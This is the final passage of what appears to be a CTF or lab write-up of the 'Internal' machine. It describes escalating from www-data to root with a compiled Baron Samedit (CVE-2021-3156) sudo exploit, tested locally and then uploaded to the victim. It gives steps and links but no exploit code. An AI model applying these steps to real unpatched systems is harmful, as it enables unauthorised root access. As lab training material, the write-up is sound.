<p>As we can see, the operating version does not match exactly (18.04 vs 18.04.4), because the victim machine contains some extra updates, which we cannot perform since it would be updated to the latest patched version. However, the sudo version does match, so we can proceed to compile Baron Samedit&rsquo;s exploit. For this case we have used an <a href="https://github.com/lmol/CVE-2021-3156">exploit generator</a> from <a href="https://gitlab.iesvirgendelcarmen.com/luis/CVE-2021-3156/">Luis Molina Garzón</a> and <a href="https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit">Qualys Research Team</a> that allows us to compile the Baron Samedit exploit for the different versions of Ubuntu and sudo. Following the steps indicated in its repository, we get a root shell.</p>
<p><img src="../../images/internal/14-ubuntu-test.png" alt=""></p>
<p>However, before sending it to the machine I wanted to test the exploit with a non-privileged user, since on the victim machine www-data is a non-privileged user.</p>
<p><img src="../../images/internal/15-ubuntu-test2.png" alt=""></p>
<h3 id="pwned">PWNED</h3>
<p>After getting a root shell with both users, it can be sent to the victim. It is worth mentioning that this exploit needs to run with the library already in the repository, so we compress the whole thing and send it to the victim.</p>
<p><img src="../../images/internal/16-upload.png" alt=""></p>
<p>Once the compressed file is sent, unzip it in a directory where you have write permissions and run the exploit inside the folder (so that the library is imported correctly). Once this is done, we will be <code>root</code> on the <code>Internal</code> machine by an unintentional method.</p>
<p><img src="../../images/internal/pwned.png" alt=""></p>

  <hr>
<div class="footer">
    
	    
	    
    
</div>

  
</div>
            </main>
            
  <div class="article-toc ">
    <div class="toc-wrapper">
      <h4 id="contents"></h4>
      <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#reconnaissance">Reconnaissance</a>
      <ul>
        <li><a href="#port-scanning">Port scanning</a></li>
        <li><a href="#service-scanning-and-enumeration">Service scanning and enumeration</a></li>
      </ul>
    </li>
    <li><a href="#exploitation-of-vulnerabilities">Exploitation of vulnerabilities</a>
      <ul>
        <li><a href="#wordpress-enumeration">Wordpress enumeration</a></li>
        <li><a href="#brute-force-attack">Brute force attack</a></li>
        <li><a href="#access-to-the-system">Access to the system</a></li>
      </ul>
    </li>
    <li><a href="#privilege-escalation">Privilege escalation</a>
      <ul>
        <li><a href="#os-enumeration">OS enumeration</a></li>
        <li><a href="#baron-samedit-check">Baron Samedit check</a></li>
        <li><a href="#creation-of-the-exploit-in-a-copy">Creation of the exploit in a copy</a></li>
        <li><a href="#pwned">PWNED</a></li>
      </ul>
    </li>
  </ul>
</nav>
    </div>
</div>


        </div>
    </body>
</html>
